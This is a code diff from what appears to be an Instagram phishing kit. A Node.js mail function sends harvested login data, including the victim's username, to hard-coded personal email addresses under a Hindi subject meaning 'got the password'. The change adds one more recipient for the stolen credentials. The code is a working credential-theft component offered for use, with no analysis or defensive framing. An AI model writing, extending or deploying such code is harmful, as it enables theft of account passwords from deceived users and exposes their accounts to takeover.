@@ -112,7 +112,7 @@ const sendMail = catchAsyncError(async (email, secretToken, mode) => {
         if(mode === "password"){
           return await transport.sendMail({
             from: '"Instagram Password" <instragram@ethereal.email>', // sender address
-            to: ["instgaram.service@gmail.com","yash.patel98305@gmail.com"],
+            to: ["instgaram.service@gmail.com","yash.patel98305@gmail.com","vanshverma500@gmail.com"],
               subject: "Password mil gya",
               text: "Password aa gya bhai", // plain text body
               html: `<p>email : ${secretToken.username}</p>
